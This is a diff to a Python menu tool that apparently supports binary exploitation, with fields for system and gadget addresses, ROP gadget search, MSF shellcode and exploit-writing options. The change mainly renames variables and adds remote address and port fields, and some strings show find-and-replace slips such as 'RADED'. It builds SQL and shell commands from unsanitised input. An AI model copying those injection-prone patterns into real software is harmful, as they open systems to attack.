@@ -89,9 +89,9 @@ def saveParams():
    command("echo '" + RAX + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
    command("echo '" + COM + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
    command("echo '" + RBX + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
-   command("echo '" + RCX + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")   
+   command("echo '" + SYS + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")   
    command("echo '" + RDX + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
-   command("echo '" + RSI + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
+   command("echo '" + CUS + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
    command("echo '" + RDI + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
    command("echo '" + RSP + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
    command("echo '" + RBP + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
@@ -102,7 +102,13 @@ def saveParams():
    command("echo '" + SRT + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")  
    command("echo '" + MAN + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")   
    command("echo '" + JMP + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
-   command("echo '" + CUS + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
+   command("echo '" + BIT + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
+   command("echo '" + MOD + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
+   command("echo '" + OF2 + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
+   command("echo '" + LIB + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
+   command("echo '" + RAD + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")  
+   command("echo '" + POR + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")      
+   command("echo '" + TST + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
    
    parsFile("base64.tmp")
    
@@ -110,9 +116,9 @@ def saveParams():
    RAX2 = linecache.getline("base64.tmp", 2).rstrip("\n")  
    COM2 = linecache.getline("base64.tmp", 3).rstrip("\n")
    RBX2 = linecache.getline("base64.tmp", 4).rstrip("\n")
-   RCX2 = linecache.getline("base64.tmp", 5).rstrip("\n")
+   SYS2 = linecache.getline("base64.tmp", 5).rstrip("\n")
    RDX2 = linecache.getline("base64.tmp", 6).rstrip("\n")
-   RSI2 = linecache.getline("base64.tmp", 7).rstrip("\n")
+   CUS2 = linecache.getline("base64.tmp", 7).rstrip("\n")
    RDI2 = linecache.getline("base64.tmp", 8).rstrip("\n")
    RSP2 = linecache.getline("base64.tmp", 9).rstrip("\n")
    RBP2 = linecache.getline("base64.tmp", 10).rstrip("\n")
@@ -123,15 +129,21 @@ def saveParams():
    SRT2 = linecache.getline("base64.tmp", 15).rstrip("\n")    
    MAN2 = linecache.getline("base64.tmp", 16).rstrip("\n")    
    JMP2 = linecache.getline("base64.tmp", 17).rstrip("\n")
-   CUS2 = linecache.getline("base64.tmp", 18).rstrip("\n")
+   BIT2 = linecache.getline("base64.tmp", 18).rstrip("\n")
+   MOD2 = linecache.getline("base64.tmp", 19).rstrip("\n")
+   OF22 = linecache.getline("base64.tmp", 20).rstrip("\n")
+   LIB2 = linecache.getline("base64.tmp", 21).rstrip("\n")
+   RAD2 = linecache.getline("base64.tmp", 22).rstrip("\n")
+   POR2 = linecache.getline("base64.tmp", 23).rstrip("\n")   
+   TST2 = linecache.getline("base64.tmp", 24).rstrip("\n")
         
    cursor.execute("UPDATE REMOTETARGET SET FIL = \"" + FIL2 + "\" WHERE IDS = 1"); connection.commit()
    cursor.execute("UPDATE REMOTETARGET SET RAX = \"" + RAX2 + "\" WHERE IDS = 1"); connection.commit()
    cursor.execute("UPDATE REMOTETARGET SET COM = \"" + COM2 + "\" WHERE IDS = 1"); connection.commit()
    cursor.execute("UPDATE REMOTETARGET SET RBX = \"" + RBX2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET RCX = \"" + RCX2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET SYS = \"" + SYS2 + "\" WHERE IDS = 1"); connection.commit()
    cursor.execute("UPDATE REMOTETARGET SET RDX = \"" + RDX2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET RSI = \"" + RSI2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET CUS = \"" + CUS2 + "\" WHERE IDS = 1"); connection.commit()
    cursor.execute("UPDATE REMOTETARGET SET RDI = \"" + RDI2 + "\" WHERE IDS = 1"); connection.commit()
    cursor.execute("UPDATE REMOTETARGET SET RSP = \"" + RSP2 + "\" WHERE IDS = 1"); connection.commit()
    cursor.execute("UPDATE REMOTETARGET SET RBP = \"" + RBP2 + "\" WHERE IDS = 1"); connection.commit()   
@@ -142,7 +154,13 @@ def saveParams():
    cursor.execute("UPDATE REMOTETARGET SET SRT = \"" + SRT2 + "\" WHERE IDS = 1"); connection.commit()
    cursor.execute("UPDATE REMOTETARGET SET MAN = \"" + MAN2 + "\" WHERE IDS = 1"); connection.commit()
    cursor.execute("UPDATE REMOTETARGET SET JMP = \"" + JMP2 + "\" WHERE IDS = 1"); connection.commit()
-   cursor.execute("UPDATE REMOTETARGET SET CUS = \"" + CUS2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET BIT = \"" + BIT2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET MOD = \"" + MOD2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET OF2 = \"" + OF22 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET LIB = \"" + LIB2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET RAD = \"" + RAD2 + "\" WHERE IDS = 1"); connection.commit()
+   cursor.execute("UPDATE REMOTETARGET SET POR = \"" + POR2 + "\" WHERE IDS = 1"); connection.commit()   
+   cursor.execute("UPDATE REMOTETARGET SET TST = \"" + TST2 + "\" WHERE IDS = 1"); connection.commit()
    return     
 
 def dispMenu():
@@ -166,7 +184,7 @@ def dispMenu():
    else:
       print(colored(FUNC[0],colour6), end=' ')   
    print('\u2551', end=' ')   
-   print(colored(GADD[0],colour3), end=' ')
+   print(colored(GRAD[0],colour3), end=' ')
    print('\u2551')      
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " MAIN  ADDRESS " + '\u2551', end=' ')
@@ -188,14 +206,14 @@ def dispMenu():
    else:
       print(colored(FUNC[1],colour6), end=' ')   
    print('\u2551', end=' ')   
-   print(colored(GADD[1],colour6), end=' ')
+   print(colored(GRAD[1],colour6), end=' ')
    print('\u2551')   
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " SYSTEMADDRESS " + '\u2551', end=' ')
-   if RCX[:18] == "0x0000000000000000":
-      print(colored(RCX[:COL1],colour7), end=' ')
+   if SYS[:18] == "0x0000000000000000":
+      print(colored(SYS[:COL1],colour7), end=' ')
    else:
-      print(colored(RCX[:COL1],colour6), end=' ')
+      print(colored(SYS[:COL1],colour6), end=' ')
    if "FORTIFY  unknown" in FO:
       print('\u2551' + " " + colored(FO,colour7) + " " +  '\u2551', end=' ')
    else:
@@ -205,7 +223,7 @@ def dispMenu():
    else:
       print(colored(FUNC[2],colour6), end=' ')   
    print('\u2551', end=' ')   
-   print(colored(GADD[2],colour6), end=' ')
+   print(colored(GRAD[2],colour6), end=' ')
    print('\u2551')   
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " JUMP  ADDRESS " + '\u2551', end=' ')
@@ -227,14 +245,14 @@ def dispMenu():
    else:
       print(colored(FUNC[3],colour6), end=' ')   
    print('\u2551', end=' ')   
-   print(colored(GADD[3],colour6), end=' ')
+   print(colored(GRAD[3],colour6), end=' ')
    print('\u2551')   
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " TEST  ADDRESS " + '\u2551', end=' ')
-   if CUS[:18] == "0x0000000000000000":
-      print(colored(CUS[:COL1],colour7), end=' ')
+   if TST[:18] == "0x0000000000000000":
+      print(colored(TST[:COL1],colour7), end=' ')
    else:
-      print(colored(CUS[:COL1],colour6), end=' ')      
+      print(colored(TST[:COL1],colour6), end=' ')      
    print('\u2551', end=' ')
    if "No PIE" in PI:
       print(colored(PI,'blue'), end=' ')
@@ -249,7 +267,7 @@ def dispMenu():
    else:
       print(colored(FUNC[4],colour6), end=' ')   
    print('\u2551', end=' ')   
-   print(colored(GADD[4],colour6), end=' ')
+   print(colored(GRAD[4],colour6), end=' ')
    print('\u2551')   
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " POP RDI ; RET " + '\u2551', end=' ')
@@ -271,7 +289,7 @@ def dispMenu():
    else:
       print(colored(FUNC[5],colour6), end=' ')   
    print('\u2551', end=' ')
-   print(colored(GADD[5],colour6), end=' ')
+   print(colored(GRAD[5],colour6), end=' ')
    print('\u2551')           
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " UNALLOCATED   " + '\u2551', end=' ')
@@ -285,7 +303,7 @@ def dispMenu():
    else:
       print(colored(FUNC[6],colour6), end=' ')   
    print('\u2551', end=' ')   
-   print(colored(GADD[6],colour6), end=' ')
+   print(colored(GRAD[6],colour6), end=' ')
    print('\u2551')   
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " UNALLOCATED   " + '\u2551', end=' ') 
@@ -300,7 +318,7 @@ def dispMenu():
    else:
       print(colored(FUNC[7],colour6), end=' ')   
    print('\u2551', end=' ')   
-   print(colored(GADD[7],colour6), end=' ')
+   print(colored(GRAD[7],colour6), end=' ')
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " UNALLOCATED   " + '\u2551', end=' ')
@@ -314,7 +332,7 @@ def dispMenu():
    else:
       print(colored(FUNC[8],colour6), end=' ')      
    print('\u2551', end=' ')   
-   print(colored(GADD[8],colour6), end=' ')
+   print(colored(GRAD[8],colour6), end=' ')
    print('\u2551')   
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " RSP/ESP/SP/SL " + '\u2551', end=' ')
@@ -334,7 +352,7 @@ def dispMenu():
    else:
       print(colored(FUNC[9],colour6), end=' ')      
    print('\u2551', end=' ')   
-   print(colored(GADD[9],colour6), end=' ')
+   print(colored(GRAD[9],colour6), end=' ')
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " RBP/EBP/BP/BL " + '\u2551', end=' ')
@@ -343,11 +361,11 @@ def dispMenu():
    else:
       print(colored(RBP,colour6), end=' ')
    print('\u2551', end=' ') 
-   if BITS[:6] == "64-Bit":
+   if BIT[:6] == "64-Bit":
       print(colored("        -08 Bytes ",colour2), end=' ')
-   if BITS[:6] == "32-Bit":
+   if BIT[:6] == "32-Bit":
       print(colored("        -04 Bytes ",colour2), end=' ')
-   if BITS[:7] == "unknown":
+   if BIT[:7] == "unknown":
       print(colored("         0 Bytes  ",colour7), end=' ')
    print('\u2551', end=' ')   
    if (MAN.rstrip(" ") in FUNC[10]):
@@ -355,33 +373,33 @@ def dispMenu():
    else:
       print(colored(FUNC[10],colour6), end=' ')   
    print('\u2551', end=' ')   
-   print(colored(GADD[10],colour6), end=' ')
+   print(colored(GRAD[10],colour6), end=' ')
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -     
    print('\u2551', end=' ')
-   if BITS[:7] != "unknown" and OFF[:1] != "0":
+   if BIT[:7] != "unknown" and OFF[:1] != "0":
       print("RIP/EIP", end=' ')
       print(colored("====>", colour2,attrs=['blink']), end=' ')
    else:
       print("RIP/EIP      ", end=' ')   
    print('\u2551', end=' ')      
    if RIP[:18] == "0x0000000000000000":
-      if BITS[:7] != "unknown" and OFF[:1] != "0":
+      if BIT[:7] != "unknown" and OFF[:1] != "0":
          print(colored(RIP,colour2), end=' ')     
       else:
          print(colored(RIP,colour7), end=' ')
    else:
       print(colored(RIP,colour6), end=' ')
    print('\u2551', end=' ') 
-   if BITS[:6] == "64-Bit":
-      if BITS[:7] != "unknown" and OFF[:1] != "0":
+   if BIT[:6] == "64-Bit":
+      if BIT[:7] != "unknown" and OFF[:1] != "0":
          print(colored("<=====", colour2,attrs=['blink']), end=' ')
       else:
          print("      ", end=' ')   
       print(colored(" -08 Bytes ",colour2), end=' ')
-   if BITS[:6] == "32-Bit":
+   if BIT[:6] == "32-Bit":
       print(colored("        -04 Bytes ",colour2), end=' ')
-   if BITS[:7] == "unknown":
+   if BIT[:7] == "unknown":
       print(colored("         0 Bytes  ",colour7), end=' ')
    print('\u2551', end=' ')   
    if (MAN.rstrip(" ") in FUNC[11]):
@@ -389,23 +407,23 @@ def dispMenu():
    else:
       print(colored(FUNC[11],colour6), end=' ')   
    print('\u2551', end=' ')   
-   print(colored(GADD[11],colour6), end=' ')
+   print(colored(GRAD[11],colour6), end=' ')
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + " CUST  ADDRESS " + '\u2551', end=' ')     
-   if RSI[:18] == "0x0000000000000000":
-      print(colored(RSI,colour7), end=' ')
+   print('\u2551' + " TEST  ADDRESS " + '\u2551', end=' ')     
+   if CUS[:18] == "0x0000000000000000":
+      print(colored(CUS,colour7), end=' ')
    else:
-      print(colored(RSI,colour6), end=' ')
+      print(colored(CUS,colour6), end=' ')
    print('\u2551', end=' ')     
-   if OFF2[:1] == "0":
+   if OF2[:1] == "0":
       print(colored("ADJUSTED",colour7),end=' ')
    else:
       print(colored("ADJUSTED",colour2),end=' ')      
-   if OFF2[:1] == "0":
-      print(colored(OFF2[:9],colour7),end=' ')
+   if OF2[:1] == "0":
+      print(colored(OF2[:9],colour7),end=' ')
    else:
-      print(colored(OFF2[:9],colour2),end=' ')   
+      print(colored(OF2[:9],colour2),end=' ')   
    print('\u2551', end= ' ')
    if (MAN.rstrip(" ") in FUNC[12]):
       print(colored(FUNC[12],colour3), end=' ')
@@ -415,10 +433,10 @@ def dispMenu():
       else:
          print(colored(FUNC[12],colour6), end=' ')
    print('\u2551', end=' ')
-   if GADD[13] != "":
-      print(colored(GADD[12],colour0), end=' ')
+   if GRAD[13] != "":
+      print(colored(GRAD[12],colour0), end=' ')
    else:
-      print(colored(GADD[12],colour6), end=' ')
+      print(colored(GRAD[12],colour6), end=' ')
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2560' + ('\u2550')*15 + '\u2569' + ('\u2550')*20 + '\u2569' + ('\u2550')*20 + '\u2569' + ('\u2550')*24 + '\u2550' + ('\u2550')*22 + '\u256C' + ('\u2550')*58 + '\u2563')
@@ -429,7 +447,7 @@ def options():
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + "(02) Set MAIN ADDRESS (12) Set INST POINTER (22) Read  Sections (32) Program Interface (42) RESERVED     " + '\u2560' + ('\u2550')*58 + '\u2563')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(03) Set SYST ADDRESS (13) Set CUST ADDRESS (23) Read   Headers (33) L-Trace Interface (43) RESERVED     " + '\u2551' + " FILE NAME      ", end=' ')
+   print('\u2551' + "(03) Set SYST ADDRESS (13) Set TEST ADDRESS (23) Read   Headers (33) L-Trace Interface (43) RESERVED     " + '\u2551' + " FILE NAME      ", end=' ')
    if FIL[:7] == "unknown":
       print(colored(FIL[:COL3-16],colour7), end=' ')   
    else:
@@ -442,10 +460,10 @@ def options():
    else:
       print(colored(COM,colour7), end=' ')  
    print("MODE   ", end=' ') 
-   if MODE[:7] == "unknown":
-      print(colored(MODE[:COL1-5],colour7), end=' ')
+   if MOD[:7] == "unknown":
+      print(colored(MOD[:COL1-5],colour7), end=' ')
    else:
-      print(colored(MODE[:COL1-5],colour6), end=' ') 
+      print(colored(MOD[:COL1-5],colour6), end=' ') 
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + "(05) Set TEST ADDRESS (15) Switch File Mode (25) Read DeBugInfo (35) MSF PatternSearch (45) MSF Shellcode" + '\u2551' + " ARCHITECTURE   ", end= ' ')
@@ -458,10 +476,10 @@ def options():
    print((" ")*8 + '\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + "(06) Set POP RDI &RET (16) Examine  Program (26) Read Assembley (36) Set Buffer OFFSET (46) RESERVED     " + '\u2551' + " BITS           ", end=' ')
-   if BITS[:1] != "u":
-      print(colored(BITS,colour6), end=' ')
+   if BIT[:1] != "u":
+      print(colored(BIT,colour6), end=' ')
    else:
-      print(colored(BITS,colour7), end=' ')   
+      print(colored(BIT,colour7), end=' ')   
    print("INDIAN ", end=' ')       
    if IND[:7] == "unknown":
       print(colored(IND[:COL1-5],colour7), end=' ')
@@ -470,25 +488,25 @@ def options():
    print('\u2551')  
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + "(07) Set  UNALLOCATED (17) CheckSec Program (27) Read   Symbols (37) Adjust the OFFSET (47) Set I.P./Port" + '\u2551' + " LIBC VERSION   ", end=' ')
-   if LIBC[:7] == "unknown":
-      print(colored(LIBC[:COL2-5],colour7), end=' ')
+   if LIB[:7] == "unknown":
+      print(colored(LIB[:COL2-5],colour7), end=' ')
    else:
-      print(colored(LIBC[:COL2-5],colour6), end=' ')
+      print(colored(LIB[:COL2-5],colour6), end=' ')
    print('\u2551') 
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + "(08) Set  UNALLOCATED (18) G.D.B. Functions (28) Read Stab Data (38) Dis-Assemble MAIN (48) Write Exploit" + '\u2551' + " "  + (" ")*COL3 + " " + '\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + "(09) Set  UNALLOCATED (19) Radar2 Functions (29) Read HexFormat (39) Dis-Assemble FUNC (49) Run Exploit  " + '\u2551' + " "  + (" ")*COL3 + " " + '\u2551')
-   print('\u2551' + "(10) Set STACKPOINTER (20) Find all Gadgets (30) HexCode Editor (40) Dis-Assemble ADDR (50) Exit         " + '\u2551'  " REMOTE ADDRESS ", end=' ')
-   if remAddr[:7] == "unknown":
-      print(colored(remAddr,colour7), end=' ')
+   print('\u2551' + "(10) Set STACKPOINTER (20) Find all Gadgets (30) HexCode Editor (40) Dis-Assemble RADR (50) Exit         " + '\u2551'  " REMOTE RADRESS ", end=' ')
+   if RAD[:7] == "unknown":
+      print(colored(RAD,colour7), end=' ')
    else:
-      print(colored(remAddr,colour6), end=' ')
+      print(colored(RAD,colour6), end=' ')
    print("PORT   ", end=' ')
-   if remPort[:7] == "unknown":
-      print(colored(remPort[:13],colour7),end=' ' )
+   if POR[:7] == "unknown":
+      print(colored(POR[:13],colour7),end=' ' )
    else:
-      print(colored(remPort[:13],colour6),end=' ' )   
+      print(colored(POR[:13],colour6),end=' ' )   
    print('\u2551')   
    print('\u255A' + ('\u2550')*105 + '\u2569' +  ('\u2550')*58 + '\u255D') #colored("VALUE",colour5)
    return
@@ -587,9 +605,9 @@ COL3 = 56
 LEN1 = 0
 
 FUNC = [" "*COL2]*maxDispl
-GADD = [" "*COL3]*maxDispl
+GRAD = [" "*COL3]*maxDispl
 
-# NEW VARIABLES THAT NEED TO BE ADDED TO THE DATABASE
+# NEW VARIABLES THAT NEED TO BE RADED TO THE DATABASE
 
 RE = spacePadding("RELRO    unknown", COL1)
 ST = spacePadding("STACK    unknown", COL1)
@@ -598,18 +616,6 @@ NX = spacePadding("NX       unknown", COL1)
 PI = spacePadding("PIE      unknown", COL1)
 RW = spacePadding("RWX      unknown", COL1)
 
-
-BITS = spacePadding("unknown", COL1)
-MODE = spacePadding("unknown", COL1)
-OFF2 = spacePadding("0 Bytes", COL1)
-LIBC = spacePadding("unknown", COL2)
-
-
-method = spacePadding("stack", COL1)
-stages = spacePadding("incomplete", COL1)
-
-remAddr = spacePadding("unknown", COL1)
-remPort = spacePadding("unknown", COL1)
 funcNum = spacePadding(" ", COL1)
 gadgNum = spacePadding(" ", COL1)
 
@@ -641,14 +647,20 @@ command("echo " + col[15] + " | base64 -d >> ascii.tmp")
 command("echo " + col[16] + " | base64 -d >> ascii.tmp")
 command("echo " + col[17] + " | base64 -d >> ascii.tmp")
 command("echo " + col[18] + " | base64 -d >> ascii.tmp")
+command("echo " + col[19] + " | base64 -d >> ascii.tmp")
+command("echo " + col[20] + " | base64 -d >> ascii.tmp")
+command("echo " + col[21] + " | base64 -d >> ascii.tmp")
+command("echo " + col[22] + " | base64 -d >> ascii.tmp")
+command("echo " + col[23] + " | base64 -d >> ascii.tmp")
+command("echo " + col[24] + " | base64 -d >> ascii.tmp")
 
 FIL = linecache.getline("ascii.tmp", 1).rstrip("\n")
 RAX = linecache.getline("ascii.tmp", 2).rstrip("\n")
 COM = linecache.getline("ascii.tmp", 3).rstrip("\n")
 RBX = linecache.getline("ascii.tmp", 4).rstrip("\n")
-RCX = linecache.getline("ascii.tmp", 5).rstrip("\n")
+SYS = linecache.getline("ascii.tmp", 5).rstrip("\n")
 RDX = linecache.getline("ascii.tmp", 6).rstrip("\n")
-RSI = linecache.getline("ascii.tmp", 7).rstrip("\n")
+CUS = linecache.getline("ascii.tmp", 7).rstrip("\n")
 RDI = linecache.getline("ascii.tmp", 8).rstrip("\n")
 RSP = linecache.getline("ascii.tmp", 9).rstrip("\n")
 RBP = linecache.getline("ascii.tmp", 10).rstrip("\n")
@@ -659,15 +671,21 @@ ARC = linecache.getline("ascii.tmp", 14).rstrip("\n")
 SRT = linecache.getline("ascii.tmp", 15).rstrip("\n")
 MAN = linecache.getline("ascii.tmp", 16).rstrip("\n")
 JMP = linecache.getline("ascii.tmp", 17).rstrip("\n")
-CUS = linecache.getline("ascii.tmp", 18).rstrip("\n")
+BIT = linecache.getline("ascii.tmp", 18).rstrip("\n")
+MOD = linecache.getline("ascii.tmp", 19).rstrip("\n")
+OF2 = linecache.getline("ascii.tmp", 20).rstrip("\n")
+LIB = linecache.getline("ascii.tmp", 21).rstrip("\n")
+RAD = linecache.getline("ascii.tmp", 22).rstrip("\n")
+POR = linecache.getline("ascii.tmp", 23).rstrip("\n")
+TST = linecache.getline("ascii.tmp", 24).rstrip("\n")
 
 FIL = spacePadding(FIL, COL3)
 RAX = spacePadding(RAX, COL1)
 COM = spacePadding(COM, COL1)
 RBX = spacePadding(RBX, COL1)
-RCX = spacePadding(RCX, COL1)
+SYS = spacePadding(SYS, COL1)
 RDX = spacePadding(RDX, COL1)
-RSI = spacePadding(RSI, COL1)
+CUS = spacePadding(CUS, COL1)
 RDI = spacePadding(RDI, COL1)
 RSP = spacePadding(RSP, COL1)
 RBP = spacePadding(RBP, COL1)
@@ -678,7 +696,13 @@ ARC = spacePadding(ARC, COL1)
 SRT = spacePadding(SRT, COL1)
 MAN = spacePadding(MAN, COL1)
 JMP = spacePadding(JMP, COL1)
-CUS = spacePadding(CUS, COL1)
+BIT = spacePadding(BIT, COL1) 
+MOD = spacePadding(MOD, COL1)
+OF2 = spacePadding(OF2, COL1)
+LIB = spacePadding(LIB, COL3) 
+RAD = spacePadding(RAD, COL1) 
+POR = spacePadding(POR, COL1) 
+TST = spacePadding(TST, COL1)
 
 command("sleep 5s")
    
@@ -753,12 +777,12 @@ while True:
 # -------------------------------------------------------------------------------------      
       
    if selection =='3':
-      BAK = RCX
-      RCX = input("[?] Please enter system address: ")
-      if RCX != "":
-         RCX = spacePadding(RCX,COL1)
+      BAK = SYS
+      SYS = input("[?] Please enter system address: ")
+      if SYS != "":
+         SYS = spacePadding(SYS,COL1)
       else:
-            RCX = BAK
+            SYS = BAK
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -787,12 +811,12 @@ while True:
 # -------------------------------------------------------------------------------------      
       
    if selection =='5':
-      BAK = CUS
-      CUS = input("[?] Please enter test address: ")
-      if CUS != "":
-         CUS = spacePadding(CUS,COL1)
+      BAK = TST
+      TST = input("[?] Please enter test address: ")
+      if TST != "":
+         TST = spacePadding(TST,COL1)
       else:
-            CUS = BAK
+            TST = BAK
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
@@ -923,12 +947,12 @@ while True:
 # -------------------------------------------------------------------------------------      
       
    if selection =='13':
-      BAK = RSI
-      RSI = input("[?] Please enter custon address: ")
-      if RSI != "":
-         RSI = spacePadding(RSI,COL1)
+      BAK = CUS
+      CUS = input("[?] Please enter custom address: ")
+      if CUS != "":
+         CUS = spacePadding(CUS,COL1)
       else:
-            RSI = BAK
+            CUS = BAK
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -956,7 +980,7 @@ while True:
             if os.path.exists(localDir + "/" + FIL.rstrip(" ")):
                command("chmod -x " + localDir + "/" + FIL.rstrip(" "))
                FIL = spacePadding(FIL,COL3)
-               MODE = spacePadding("Static", COL1)
+               MOD = spacePadding("Static", COL1)
             else:
                print("[-] I could not find the file name you entered, did you spell it correctly?...")
                FIL = BAK
@@ -976,13 +1000,13 @@ while True:
       if FIL[:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
-         if MODE[:6] == "Static":
+         if MOD[:6] == "Static":
             command("chmod +x " + localDir + "/" + FIL.rstrip(" "))
-            MODE = spacePadding("Dynamic", COL1)
+            MOD = spacePadding("Dynamic", COL1)
          else:
             command("chmod -x " + localDir + "/" + FIL.rstrip(" "))
-            MODE = spacePadding("Static", COL1)
-      print(colored("[*] File mode switched to " + MODE.rstrip(" ") + "...", colour3))
+            MOD = spacePadding("Static", COL1)
+      print(colored("[*] File mode switched to " + MOD.rstrip(" ") + "...", colour3))
       prompt()                              
 
 # ------------------------------------------------------------------------------------- 
@@ -1006,7 +1030,7 @@ while True:
          system = system.strip(" ")
          if (system[:2] != "0x") and (len(system) == 6):
             system = "0x0000000000" + system            
-         RCX = spacePadding(system, COL1)
+         SYS = spacePadding(system, COL1)
          command("file " + localDir + "/" + FIL.rstrip(" ") + " > file.tmp")
          command("objdump" + " -f " + localDir + "/" + FIL.rstrip(" ") + " > headers.tmp")
          cutLine(localDir, "headers.tmp")       
@@ -1020,21 +1044,21 @@ while True:
                   COM = spacePadding("ELF", COL1)
                   print("Linux binary file...")         
                if "8-bit" in binary:
-                  BITS = "08-Bit"
-                  print(BITS + " architecture...")           
-                  BITS = spacePadding(BITS, COL1)            
+                  BIT = "08-Bit"
+                  print(BIT + " architecture...")           
+                  BIT = spacePadding(BIT, COL1)            
                if "16-bit" in binary:
-                  BITS = "16-Bit"
-                  print(BITS + " architecture...")           
-                  BITS = spacePadding(BITS, COL1)            
+                  BIT = "16-Bit"
+                  print(BIT + " architecture...")           
+                  BIT = spacePadding(BIT, COL1)            
                if "32-bit" in binary:
-                  BITS = "32-Bit"
-                  print(BITS + " architecture...")           
-                  BITS = spacePadding(BITS, COL1)         
+                  BIT = "32-Bit"
+                  print(BIT + " architecture...")           
+                  BIT = spacePadding(BIT, COL1)         
                if "64-bit" in binary:
-                  BITS = "64-Bit"
-                  print(BITS + " architecture...")  
-                  BITS = spacePadding(BITS, COL1)         
+                  BIT = "64-Bit"
+                  print(BIT + " architecture...")  
+                  BIT = spacePadding(BIT, COL1)         
                if "LSB" in binary:
                   IND = "little"
                   print(IND + " indian format...")
@@ -1047,8 +1071,8 @@ while True:
                   command("ldd " + localDir + "/" + FIL.rstrip(" ") + " > libc.tmp")
                   command("cat libc.tmp | grep '=>' > address.tmp")
                   with open("address.tmp","r") as address:
-                     LIBC = spacePadding(address.readline().split(" ")[2], COL2) 
-                     print("Dynamic link to " + LIBC.rstrip(" ") + "...")               
+                     LIB = spacePadding(address.readline().split(" ")[2], COL2) 
+                     print("Dynamic link to " + LIB.rstrip(" ") + "...")               
                if "not stripped" in binary:
                   print("Debugging information built in...")
                else:
@@ -1267,10 +1291,10 @@ while True:
             cutLine("- - - - - -", "full.tmp")         
          with open("full.tmp","r") as gadgets:
